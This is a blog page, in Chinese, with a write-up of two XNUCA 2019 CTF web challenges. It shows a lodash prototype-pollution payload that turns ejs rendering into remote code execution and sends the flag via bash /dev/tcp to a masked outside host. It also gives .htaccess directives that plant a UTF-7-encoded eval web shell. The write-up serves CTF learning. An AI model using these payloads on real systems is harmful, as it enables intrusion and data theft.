@@ -1,0 +1,768 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Web,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="首发于https://www.anquanke.com/post/id/185377   周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。  HardJS我们的解法比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XNUCA qualifier writeup">
+<meta property="og:url" content="http://yoursite.com/uncategorized/XNUCA-qualifier-md/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="首发于https://www.anquanke.com/post/id/185377   周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。  HardJS我们的解法比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567017747/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.42.08_tjlghj.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018177/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.49.19_uhwvvr.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018436/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.53.42_nvsfjo.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018509/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.54.52_nyndle.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018384/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.52.42_ypo8ns.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567019105/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.04.53_zi1rje.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567019227/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.06.53_ftongv.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567046276/blog/QQ20190829-0_txkv7i.jpg">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567046527/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.40.21_w1f58y.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png">
+<meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png">
+<meta property="og:updated_time" content="2019-09-21T16:01:59.674Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XNUCA qualifier writeup">
+<meta name="twitter:description" content="首发于https://www.anquanke.com/post/id/185377   周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。  HardJS我们的解法比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后">
+<meta name="twitter:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/uncategorized/XNUCA-qualifier-md/">
+
+  <title> XNUCA qualifier writeup | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Web/" rel="tag" title="Web">Web</a>
+      
+      </div>
+      <h1>XNUCA qualifier writeup</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2019-08-29T02:26:12+08:00" content="2019-08-29" title="2019-08-29 02:26:12">
+          2019-08-29
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                XNUCA qualifier writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2019-08-29T02:26:12+08:00" content="2019-08-29">
+              2019-08-29
+            </time>
+          </span>
+
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>首发于<a href="https://www.anquanke.com/post/id/185377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185377</a></p>
+</blockquote>
+<blockquote>
+<p>周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。</p>
+</blockquote>
+<h2 id="HardJS"><a href="#HardJS" class="headerlink" title="HardJS"></a>HardJS</h2><h3 id="我们的解法"><a href="#我们的解法" class="headerlink" title="我们的解法"></a>我们的解法</h3><p>比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后端的代码审计上。</p>
+<p>拿到一个nodejs项目的源码进行审计，第一步便是运行<code>npm audit</code> ，可以看到依赖项的漏洞情况。</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017506/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.33.58_k7scsn.png" alt="image-20190829023406409"></p>
+<p>可以看到依赖项<code>lodash</code>存在原型链污染漏洞，即<code>CVE-2019-10744</code>.</p>
+<p>我们查看一下项目的js源码，看看哪里调用了lodash.在查看消息的请求处理中我们可以看到当消息数量大于5时将会调用<code>lodash.defaultsDeep</code>来合并消息</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567017747/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.42.08_tjlghj.png" alt="lodash"></p>
+<p>根据<code>CVE-2019-10744</code>的信息，我们知道我们只需要有消息为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"test"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"a"</span>:<span class="string">"b"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>在合并时便会在<code>Object</code>上附加<code>a=b</code>这样一个属性，任意不存在a属性的原型为Object的对象在访问其<code>a</code>属性时均会获取到<code>b</code>属性。那么这个污染究竟会起到什么样的效果？</p>
+<p>查看项目源码，可以知道该项目使用<code>ejs</code>库作为模版引擎，众所周知<code>ejs</code>作为一个模版引擎肯定少不了类似<code>eval</code>的操作用于解析一些数据。因此我们便可以去跟一下ejs的实现看看哪里有潜在的可以收到原型链污染的调用，这里我们可以找到两处可用的地方</p>
+<h4 id="pollution-one"><a href="#pollution-one" class="headerlink" title="pollution one"></a>pollution one</h4><p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018177/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.49.19_uhwvvr.png" alt="pollution one"></p>
+<p>在577行可以看到很大的一片调用全是为了动态拼接一个js语句，这里我们可以注意到当<code>opts</code>存在属性<code>outputFunctionName</code>时,该属性<code>outputFunctionName</code>便会被直接拼接到这段js中。</p>
+<p>往下跟一下可以看到这段js的具体调用位置</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018436/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.53.42_nvsfjo.png" alt="append"></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018509/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.54.52_nyndle.png" alt="src"></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018384/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%882.52.42_ypo8ns.png" alt="ctor"></p>
+<p>可以看到这段代码最后生成了一个动态的函数，且源码中正含有上述的<code>append</code>.所以我们的思路就很清晰了，只要覆盖了<code>opts.outputFunctionName</code>即可触发模版编译处的RCE.</p>
+<p>最后我们的payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"mmp"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:</span><br><span class="line">&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。</p>
+<h3 id="pollution-two"><a href="#pollution-two" class="headerlink" title="pollution two"></a>pollution two</h3><p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png" alt></p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png" alt></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖<code>login</code>与<code>userid</code>即可</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567019105/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.04.53_zi1rje.png" alt></p>
+<p>而前端的原型链污染则是由于调用了<code>$.extend</code>方法</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567019227/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.06.53_ftongv.png" alt="extend"></p>
+<p>所有的消息都被加入了no-js，我们再看看页面是怎么渲染的</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567046276/blog/QQ20190829-0_txkv7i.jpg" alt="logger"></p>
+<p>Header/notice/wiki/button/message的地方都处在沙箱中，无法XSS，我们再看看页面</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567046527/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.40.21_w1f58y.png" alt></p>
+<p>可以看到我们只要通过原型链污染添加logger属性，即可覆盖logger的内容从而导致XSS。为了打到flag只需要让页面跳转到一个我们设置的伪造的登录窗口即可。</p>
+<p>这道题目预期解将前后端的原型链污染结合利用，可以说是十分精妙的一道题目。</p>
+<h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><p>源码很简单(感觉越简单的源码越不好搞)，一个写文件的功能且只能写文件名为<code>[a-z\.]*</code> 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入<code>.htaccess</code>里面<code>auto_prepend_file</code>等php_value。</p>
+<h3 id="我们的解法-1"><a href="#我们的解法-1" class="headerlink" title="我们的解法"></a>我们的解法</h3><p>经测试，最后一行导致的<code>.htaccess</code>报错的问题可以通过<code># \</code>来解决。</p>
+<p>该文件中有一处<code>include(&#39;fl3g,php&#39;)</code>,该文件名不能通过正则匹配所以我们没办法直接利用该文件来getshell。那么还有什么<code>.htaacess</code>    的选项可以利用？</p>
+<p>翻一下php的官方文档<a href="https://www.php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">php.ini配置选项列表</a>，查找所有可修改范围为<code>PHP_INI_ALL</code>即<code>PHP_INI_PERDIR</code>的配置项，我们可以注意到这样一个选项<code>include_path</code>.</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png" alt="include_path"></p>
+<p>因此只要控制<code>include_path</code>便可以使这里include进来的<code>fl3g.php</code>可以是任意目录下的某个文件，那么怎样才能控制<code>fl3g.php</code>的内容?查找所有php log相关的功能可以看到<code>error_log</code>这一选项</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png" alt="error_log"></p>
+<p>所以我们的思路便很清晰了：利用error_log写入log文件到<code>/tmp/fl3g.php</code>，再设置<code>include_path=/tmp</code>即可让index.php能够包含我们想要的文件。这里的报错可以通过设置<code>include_path</code>到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。</p>
+<p>然而很不幸的是error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload。那么怎么才能绕过这里的转义？</p>
+<p>查找最近的比赛我们可以发现一篇writeup<a href="[https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack 2019/l33t-hoster/l33t-hoster.md">Insomnihack 2019 I33t-hoster</a>)</p>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png" alt="run php without &lt;"></p>
+<p>这便给了我们启示可以通过设置编码来绕过限制从而getshell.</p>
+<p>因此最后的攻击方法如下：</p>
+<ul>
+<li>Step1 写入<code>.htaccess</code> error_log相关的配置</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Step2 访问index.php留下error_log</li>
+<li>Step3 写入.htaccess新的配置</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Step4 再访问一次<code>index.php?2=evilcode</code>即可getshell.</li>
+</ul>
+<h3 id="其他非预期解"><a href="#其他非预期解" class="headerlink" title="其他非预期解"></a>其他非预期解</h3><p>赛后得知我们的解法是全场唯一的正解，此外还存在两个非预期</p>
+<h4 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h4><p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
+<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>只能说这个非预期为啥我没有想到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line"># &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上便是我们这次XNUCA web部分的writeup，质量非常高的一场比赛，感谢NESE的大佬们。希望国内能多一些这样质量高的CTF，少一些诸如某空间之类的垃圾比赛，也希望CTF圈选手们以后都能<code>洁身自好</code>杜绝py现象。</p>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" <i class="fa fa-tag">Web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Web/java-deserialize/" rel="next" title="java反序列化漏洞的一些利用链分析">
+                <i class="fa fa-chevron-left"></i> java反序列化漏洞的一些利用链分析
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HardJS"><span class="nav-number">1.</span> <span class="nav-text">HardJS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法"><span class="nav-number">1.1.</span> <span class="nav-text">我们的解法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pollution-one"><span class="nav-number">1.1.1.</span> <span class="nav-text">pollution one</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pollution-two"><span class="nav-number">1.2.</span> <span class="nav-text">pollution two</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预期解"><span class="nav-number">1.3.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPHP"><span class="nav-number">2.</span> <span class="nav-text">ezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法-1"><span class="nav-number">2.1.</span> <span class="nav-text">我们的解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他非预期解"><span class="nav-number">2.2.</span> <span class="nav-text">其他非预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#非预期1"><span class="nav-number">2.2.1.</span> <span class="nav-text">非预期1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期2"><span class="nav-number">2.3.</span> <span class="nav-text">非预期2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
